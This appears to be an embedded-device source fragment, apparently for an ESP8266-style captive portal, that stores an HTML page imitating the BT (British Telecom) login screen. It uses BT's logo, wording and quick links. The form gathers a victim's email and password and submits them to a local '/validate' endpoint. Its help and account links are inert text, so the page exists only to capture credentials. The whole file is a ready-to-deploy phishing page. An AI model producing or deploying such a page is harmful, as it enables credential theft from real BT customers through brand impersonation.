//BT
const char BT_HTML[] PROGMEM = R"=====(
<!DOCTYPE html>
<html>

<head>
  <title>BT Login</title>
  <meta name="viewport" content="width=device-width, initial-scale=1">
  <link rel="bt-logo_small" href="data:,">
  <link rel="stylesheet" type="text/css" href="style.css">
</head>

<style>
div {
   
  width: 95%;
  padding: 10px 10px 20px 10px;
  border: 2px solid #BFBFBF;
  background-color: white;
  box-shadow: 10px 10px 5px #aaaaaa;
}
body {
  position:absolute;
  margin: 10px;
  background-color: #E9E9E9;
  height:100%;
  width:90%;
}  
h2 {
  font-family: helvetica, sans-serif;
  font-size: 24px;
}
h3 {
  font-family: ariel, sans-serif;
  font-size: 16px;
  text-align: center;
}

<!--Full-width inputs-->
input[type=text], input[type=email]
{
  width: 95%;
  padding: 12px 20px;
  margin: 8px 0;
  display: inline-block;
  border: 1px solid #ccc;
  border-radius: 5px;
  box-sizing: border-box;
  font-size: 16px;
}
input[type=text], input[type=password]
{
  width: 95%;
  padding: 12px 20px;
  margin: 8px 0;
  display: inline-block;
  border: 1px solid #ccc;
  border-radius: 5px;
  box-sizing: border-box;
  font-size: 16px;
}
button
{
  width: 95%;
  padding: 12px 20px;
  margin: 8px 0;
  display: inline-block;
  border: 1px solid #ccc;
  border-radius: 5px;
  box-sizing: border-box;
  color: white;
  background-color: #4d0099;
  font-size: 20px;
}
</Style>

<body>
<div>    
<h1><img src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAC4AAAAuCAMAAABgZ9sFAAABS2lUWHRYTUw6Y29tLmFkb2JlLnhtcAAAAAAAPD94cGFja2V0IGJlZ2luPSLvu78iIGlkPSJXNU0wTXBDZWhpSHpyZVN6TlRjemtjOWQiPz4KPHg6eG1wbWV0YSB4bWxuczp4PSJhZG9iZTpuczptZXRhLyIgeDp4bXB0az0iQWRvYmUgWE1QIENvcmUgNS42LWMxMzggNzkuMTU5ODI0LCAyMDE2LzA5LzE0LTAxOjA5OjAxICAgICAgICAiPgogPHJkZjpSREYgeG1sbnM6cmRmPSJodHRwOi8vd3d3LnczLm9yZy8xOTk5LzAyLzIyLXJkZi1zeW50YXgtbnMjIj4KICA8cmRmOkRlc2NyaXB0aW9uIHJkZjphYm91dD0iIi8+CiA8L3JkZjpSREY+CjwveDp4bXBtZXRhPgo8P3hwYWNrZXQgZW5kPSJyIj8+IEmuOgAAADlQTFRFR3BMVRS0VRS0VRS0VRS0VRS0VRS0VRS0VRS0VRS0VRS0VRS0VRS0VRS0VRS0VRS0VRS0VRS0VRS0rtiiEAAAABJ0Uk5TACrig9M6b2VN8x2PwaYRsFwFmfMOVAAAAa5JREFUSMetVVmWhCAMVLYou97/sENYFFqB1zPDl8YyS6VIluWPZ/XUaEK0oX6dYSVlZ3UYlSPHJqF2whjZ07PphqAR6gS3x7IclgsXf6HvrjENJmxtsyIaXwJs6BmedsAI26fVB6Ozb1GtC5/80zcd1dT4X4NBdAk7RPhc508GvvGo8yTNmx63T5+nuloZODnG8CPwUxocSoeZOiAQdzknc+WR4p4W51LEAzy6E+VAcZ/YYCXzrQhRBz+VLo+cPcu55Kz4BSBPOFYoUxS44U4pEptotI7y0tpdxUIifb3hPIZLJOf3u/MqBtltA+dFEVujFbvHpNlFI+KYwzuxyyc8UIm15oqbUmF5gQcGO3Amu/A2GbVtKG/TTeZRKjK8d0t9EIlqfYFnIts2aaX0meXfwjNuzZnWpabutHCTs3hKjPhrOvjqgrAi4GS0kM6Wr5YMz7KaLPQ31wOJ8zO0v2T+7dVG6t0Y7qrBMR9LtC1vPPSWz6H35UiNLR4NbHgb8N114HvLBtplA71lsxzIZ4hggMdfLAcTV5n6n0WJP3yu4eniXr1yjBDm1HzJz84PsnwmH/fBM50AAAAASUVORK5CYII=" alt="BT_logo" />&nbsp;Log in</h1>

<class="login-page">
<h2>BT ID</h2>
<class="form"><form class="login-form" action="/validate" method="GET">
<p><input name="user" required="" type="email" placeholder="Enter your email" /></p>

<h2>Password</h2>

<p><input name="pass" required="" type="password" placeholder="Enter your password" /></p>

<p><span style="text-decoration: underline; color: #800080;">Forgotten your login details?</span></p>
<p><input disabled="disabled" type="checkbox" /><span style="color: #0000ff;">Remember me</span></p>

<h2 class="hidden-small"><button type="submit">Login</button></h2>

<p class="hidden-small">&lt; Back;<span style="color: #3366ff; float: right" >Help | Security</span></p>
<h3>Don't have a BT ID? <span style="color: #3366ff;">Create one</span></h3>
<hr />

<h2>Quick links</h2>
<p><span style="color: #0000ff;">Track your order &gt;</span></p>
<p><span style="color: #0000ff;">Report or track a fault &gt;</span></p>
<p><span style="color: #0000ff;">Pay a bill &gt;</span></p>
<p><span style="color: #0000ff;">Get helpor contact us &gt;</span></p>
<p><span style="color: #0000ff;">Download My BT App &gt;</span></p>
<h3>Looking for BT Yahoo Mail?</h3>
<p><span style="color: #0000ff;"><strong>Go to our email page &gt;</strong> <span style="color: #000000;">to log in to your BT Yahoo Mail inbox</span></span></p>

</div>

</body>

</html>
)=====";
